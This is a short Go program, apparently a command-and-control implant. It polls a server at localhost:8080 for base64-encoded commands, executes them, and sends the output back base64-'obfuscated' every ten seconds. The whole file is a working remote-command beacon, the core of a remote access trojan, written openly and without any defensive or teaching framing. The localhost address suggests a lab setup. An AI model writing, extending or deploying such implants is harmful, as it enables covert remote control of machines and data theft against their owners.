package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

var Reset = "\033[0m"
var Red = "\033[31m"
var Green = "\033[32m"

func sendResult(result string) {
	obfuscatedResult := base64.StdEncoding.EncodeToString([]byte(result))
	_, err := http.Post("http://localhost:8080/getRes", "text/plain", strings.NewReader(obfuscatedResult))
	if err != nil {
		fmt.Println("Error sending result:", err)
	}
}

func main() {
	for {
		response, err := http.Get("http://localhost:8080/getCommand")
		if err != nil {
			fmt.Println("Error sending request:", err)
			time.Sleep(10 * time.Second)
			continue
		}
		body, err := ioutil.ReadAll(response.Body)
		response.Body.Close()
		if err != nil {
			fmt.Println("Error reading response:", err)
			time.Sleep(10 * time.Second)
			continue
		}

		if string(body) != "no new command" {
			command, _ := base64.StdEncoding.DecodeString(string(body))
			fmt.Println("Executing command:", string(command))

			cmd_r := exec.Command(string(command))
			output, err := cmd_r.Output()
			if err != nil {
				sendResult(err.Error())
			} else {
				sendResult(string(output))
			}
		}

		time.Sleep(10 * time.Second) // Пауза между запросами
	}
}
